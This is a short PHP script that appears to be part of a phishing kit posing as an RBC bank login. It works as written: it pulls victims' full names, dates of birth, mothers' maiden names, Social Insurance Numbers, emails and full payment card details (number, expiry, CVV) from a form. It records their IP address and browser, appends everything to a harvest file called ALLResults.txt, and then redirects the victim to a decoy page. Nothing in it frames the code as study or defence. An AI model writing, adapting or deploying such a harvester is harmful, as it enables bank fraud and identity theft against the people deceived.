<?php
include('blocker.php');
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];

$message .= "Mp3=============================================\n";
$message .= "RBClogin 2 : ".$ip."\n";
$message .= "------------------------------------------------\n";
$message .= "Full Name : ".$_POST['FN']."\n";
$message .= "DOB D-M-Y : ".$_POST['DB']."\n";
$message .= "M.M.N : ".$_POST['MN']."\n";
$message .= "S.I.N : ".$_POST['SN']."\n";
$message .= "EMAIL : ".$_POST['EM']."\n";
$message .= "------------------------------------------------\n";
$message .= "Card NAME : ".$_POST['NC']."\n";
$message .= "Card NUM : ".$_POST['NUM']."\n";
$message .= "Card EXP : ".$_POST['EXP']."\n";
$message .= "Card CVV : ".$_POST['CVV']."\n";
$message .= "------------------------------------------------\n";
$message .= "BROWSER : ".$browser."\n";$browser=$_POST['browser'];
$message .= "Mp3=============================================\n";

$fp = fopen('../../../ALLResults.txt', 'a');
fwrite($fp, $message);
fclose($fp);

?>
<script>
    window.top.location.href = "redirecting.html";
</script>
